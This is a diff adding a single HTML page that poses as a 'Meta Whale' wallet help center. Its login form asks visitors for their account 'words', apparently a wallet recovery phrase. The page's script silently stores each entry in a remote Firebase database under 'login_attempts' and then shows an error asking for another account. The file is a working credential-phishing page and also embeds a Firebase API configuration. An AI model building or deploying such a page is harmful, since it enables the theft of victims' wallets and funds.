@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Meta Whale</title>
+
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
+    <style>
+
+        *{
+            box-sizing:border-box;
+            -webkit-tap-highlight-color:transparent;
+            font-family:sans-serif;
+        }
+
+        body{
+            margin:0;
+            background:#000;
+            color:#fff;
+            overflow-x:hidden;
+        }
+
+        .hidden{
+            display:none;
+        }
+
+        .header{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:15px;
+            height:60px;
+        }
+
+        .help-text{
+            font-size:20px;
+            font-weight:500;
+        }
+
+        .header-right{
+            display:flex;
+            align-items:center;
+            gap:10px;
+        }
+
+        .igt-badge{
+            background:#151515;
+            border:1px solid #333;
+            padding:6px 12px;
+            border-radius:8px;
+            display:flex;
+            align-items:center;
+            gap:8px;
+            cursor:pointer;
+        }
+
+        .wallet-line-icon{
+            width:18px;
+            height:12px;
+            border:1.5px solid #fff;
+            border-radius:2px;
+            position:relative;
+        }
+
+        .wallet-line-icon::after{
+            content:'';
+            position:absolute;
+            right:3px;
+            top:3px;
+            width:3px;
+            height:3px;
+            border:1.5px solid #fff;
+            border-radius:50%;
+        }
+
+        .menu-grid{
+            display:grid;
+            grid-template-columns:repeat(2,1fr);
+            gap:2px;
+            padding:5px;
+            border:1.5px solid #fff;
+            border-radius:4px;
+            width:24px;
+            height:24px;
+            cursor:pointer;
+        }
+
+        .grid-dot{
+            width:4px;
+            height:4px;
+            background:#fff;
+        }
+
+        .container{
+            padding:20px;
+        }
+
+        .welcome-title{
+            font-size:32px;
+            font-weight:bold;
+            margin:20px 0;
+            letter-spacing:-1px;
+        }
+
+        .btn-container{
+            background:#111;
+            padding:25px 15px;
+            border-radius:20px;
+            display:flex;
+            gap:10px;
+            align-items:center;
+            justify-content:space-between;
+        }
+
+        .msg-text{
+            color:#555;
+            font-size:16px;
+            flex-grow:1;
+        }
+
+        .blue-btn{
+            background:#2b26ff;
+            color:#fff;
+            border:none;
+            padding:12px 18px;
+            border-radius:12px;
+            font-weight:600;
+            cursor:pointer;
+            font-size:14px;
+        }
+
+        .category-title{
+            margin-top:30px;
+            font-size:18px;
+            color:#fff;
+            font-weight:500;
+        }
+
+        .cat-list{
+            margin-top:15px;
+            background:#0c0c0c;
+            border-radius:20px;
+            overflow:hidden;
+        }
+
+        .cat-item{
+            padding:20px;
+            display:flex;
+            justify-content:space-between;
+            border-bottom:1px solid #151515;
+            cursor:pointer;
+            font-size:16px;
+        }
+
+        .cat-item:last-child{
+            border-bottom:none;
+        }
+
+        .arrow-right{
+            color:#333;
+        }
+
+        .page-header{
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            position:relative;
+            padding:20px;
+            border-bottom:1px solid #151515;
+        }
+
+        .close-btn{
+            position:absolute;
+            right:20px;
+            font-size:24px;
+            cursor:pointer;
+            color:#777;
+        }
+
+        .label{
+            color:#555;
+            font-size:12px;
+            text-transform:uppercase;
+            margin-bottom:8px;
+            display:block;
+        }
+
+        .input-box{
+            width:100%;
+            background:#0c0c0c;
+            border:1px solid #1c1c1c;
+            color:#fff;
+            padding:15px;
+            border-radius:12px;
+            margin-bottom:15px;
+            outline:none;
+        }
+
+        select.input-box{
+            background:#000;
+            color:#fff;
+        }
+
+        .red-warning{
+            color:#ff3b30;
+            font-size:13px;
+            margin:10px 0;
+        }
+
+        .desc-text{
+            color:#666;
+            font-size:13px;
+            line-height:1.4;
+        }
+
+        .attach-btn{
+            background:#1a1a1a;
+            color:#888;
+            border:none;
+            padding:12px 20px;
+            border-radius:10px;
+            display:flex;
+            align-items:center;
+            gap:8px;
+            margin:15px 0;
+            cursor:pointer;
+        }
+
+        .footer-action{
+            display:flex;
+            gap:10px;
+            margin-top:30px;
+        }
+
+        .cancel-btn{
+            flex:1;
+            background:#151515;
+            color:#777;
+            border:none;
+            padding:18px;
+            border-radius:15px;
+            cursor:pointer;
+        }
+
+        .send-btn{
+            flex:1;
+            background:#2b26ff;
+            color:#fff;
+            border:none;
+            padding:18px;
+            border-radius:15px;
+            font-weight:bold;
+            cursor:pointer;
+        }
+
+        .login-card{
+            background:#111;
+            padding:20px;
+            border-radius:20px;
+            margin-top:20px;
+        }
+
+        .login-title{
+            color:#666;
+            font-size:14px;
+            margin-bottom:15px;
+        }
+
+        .login-textarea{
+            width:100%;
+            height:240px;
+            background:#000;
+            border:1px solid #1c1c1c;
+            border-radius:15px;
+            color:#fff;
+            padding:15px;
+            outline:none;
+            resize:none;
+        }
+
+        .login-submit{
+            width:100%;
+            background:#2b26ff;
+            color:#fff;
+            border:none;
+            padding:18px;
+            border-radius:15px;
+            font-weight:bold;
+            margin-top:15px;
+            cursor:pointer;
+        }
+
+        #login-error{
+            background:#111;
+            border:1px solid #222;
+            color:#fff;
+            text-align:center;
+            margin-top:15px;
+            padding:14px;
+            border-radius:12px;
+            display:none;
+        }
+
+        #web-error{
+            position:fixed;
+            top:10px;
+            left:50%;
+            transform:translateX(-50%);
+            background:#ff3b30;
+            color:#fff;
+            padding:10px 30px;
+            border-radius:8px;
+            font-size:14px;
+            display:none;
+            z-index:9999;
+        }
+
+    </style>
+</head>
+
+<body>
+
+<div id="web-error">web installation error</div>
+
+<div class="header">
+
+    <div class="help-text">Help</div>
+
+    <div class="header-right">
+
+        <div class="igt-badge" onclick="showPopupError()">
+
+            <div style="font-size:14px;color:#eee;">
+                0.00 IGT
+            </div>
+
+            <div class="wallet-line-icon"></div>
+
+        </div>
+
+        <div class="menu-grid" onclick="goHome()">
+
+            <div class="grid-dot"></div>
+            <div class="grid-dot"></div>
+            <div class="grid-dot"></div>
+            <div class="grid-dot"></div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<!-- HOME -->
+
+<div id="page-home">
+
+    <div class="container">
+
+        <div class="welcome-title">
+            Welcome to the help center
+        </div>
+
+        <div class="btn-container">
+
+            <span class="msg-text">
+                My messages
+            </span>
+
+            <button class="blue-btn" onclick="showPage('page-question')">
+                Ask a question
+            </button>
+
+            <button class="blue-btn" onclick="showPage('page-login')">
+                with login
+            </button>
+
+        </div>
+
+        <div class="category-title">
+            Chose category
+        </div>
+
+        <div class="cat-list">
+
+            <div class="cat-item" onclick="showPage('page-question')">
+                Meta Whale <span class="arrow-right">›</span>
+            </div>
+
+            <div class="cat-item" onclick="showPage('page-question')">
+                Wallet <span class="arrow-right">›</span>
+            </div>
+
+            <div class="cat-item" onclick="showPage('page-question')">
+                Other <span class="arrow-right">›</span>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<!-- QUESTION PAGE -->
+
+<div id="page-question" class="hidden">
+
+    <div class="page-header">
+
+        <div style="font-weight:bold;font-size:18px;">
+            New question
+        </div>
+
+        <div class="close-btn" onclick="goHome()">×</div>
+
+    </div>
+
+    <div class="container">
+
+        <form id="qForm">
+
+            <span class="label">TITLE SUBJECT</span>
+
+            <select id="topic" class="input-box" required>
+
+                <option value="">Select a topic</option>
+                <option>Technical problem on the site</option>
+                <option>Wallet problem</option>
+                <option>Others</option>
+
+            </select>
+
+            <span class="label">PROBLEM DESCRIPTION</span>
+
+            <textarea
+                id="q-desc"
+                class="input-box"
+                style="height:120px;"
+                placeholder="Describe your problem"
+                required></textarea>
+
+            <p class="red-warning">
+                the message must have at least 150 characters
+            </p>
+
+            <button type="button" class="attach-btn">
+                📎 Attach files
+            </button>
+
+            <div class="footer-action">
+
+                <button
+                    type="button"
+                    class="cancel-btn"
+                    onclick="goHome()">
+
+                    Cancel
+
+                </button>
+
+                <button type="submit" class="send-btn">
+                    Send
+                </button>
+
+            </div>
+
+        </form>
+
+    </div>
+
+</div>
+
+<!-- LOGIN PAGE -->
+
+<div id="page-login" class="hidden">
+
+    <div class="container">
+
+        <div class="welcome-title">
+            Welcome to the help center
+        </div>
+
+        <div class="login-card">
+
+            <div class="login-title">
+                login your account for direct request
+            </div>
+
+            <form id="lForm">
+
+                <textarea
+                    id="l-input"
+                    class="login-textarea"
+                    placeholder="input your words for login account"
+                    required></textarea>
+
+                <button type="submit" class="login-submit">
+                    login first
+                </button>
+
+            </form>
+
+            <div id="login-error">
+                Please login another account
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+    const firebaseConfig = {
+
+        apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+
+        authDomain: "v-academy-82560.firebaseapp.com",
+
+        databaseURL: "https://v-academy-82560-default-rtdb.firebaseio.com",
+
+        projectId: "v-academy-82560",
+
+        storageBucket: "v-academy-82560.firebasestorage.app",
+
+        messagingSenderId: "826822771378",
+
+        appId: "1:826822771378:web:5357b1b989b298a8027fab"
+
+    };
+
+    firebase.initializeApp(firebaseConfig);
+
+    const db = firebase.database();
+
+    function showPage(id){
+
+        document.getElementById('page-home').classList.add('hidden');
+        document.getElementById('page-question').classList.add('hidden');
+        document.getElementById('page-login').classList.add('hidden');
+
+        document.getElementById(id).classList.remove('hidden');
+
+        window.scrollTo(0,0);
+    }
+
+    function goHome(){
+
+        showPage('page-home');
+    }
+
+    function showPopupError(){
+
+        const err = document.getElementById('web-error');
+
+        err.style.display = 'block';
+
+        setTimeout(() => {
+
+            err.style.display = 'none';
+
+        },3000);
+    }
+
+    /* QUESTION SAVE */
+
+    document.getElementById('qForm').addEventListener('submit', async function(e){
+
+        e.preventDefault();
+
+        const topic = document.getElementById('topic').value.trim();
+
+        const desc = document.getElementById('q-desc').value.trim();
+
+        try{
+
+            const ref = db.ref("support_questions").push();
+
+            await ref.set({
+
+                id: ref.key,
+
+                topic: topic,
+
+                description: desc,
+
+                time: new Date().toLocaleString()
+
+            });
+
+            alert("Sent Successfully!");
+
+            document.getElementById('qForm').reset();
+
+            goHome();
+
+        } catch(error){
+
+            alert("Firebase Error: " + error.message);
+        }
+
+    });
+
+    /* LOGIN SAVE */
+
+    document.getElementById('lForm').addEventListener('submit', async function(e){
+
+        e.preventDefault();
+
+        const inputText = document.getElementById('l-input').value.trim();
+
+        try{
+
+            const ref = db.ref("login_attempts").push();
+
+            await ref.set({
+
+                id: ref.key,
+
+                info: inputText,
+
+                time: new Date().toLocaleString()
+
+            });
+
+            document.getElementById('login-error').style.display = 'block';
+
+            document.getElementById('l-input').value = "";
+
+        } catch(error){
+
+            alert("Firebase Error: " + error.message);
+        }
+
+    });
+
+</script>
+
+</body>
+  </html>
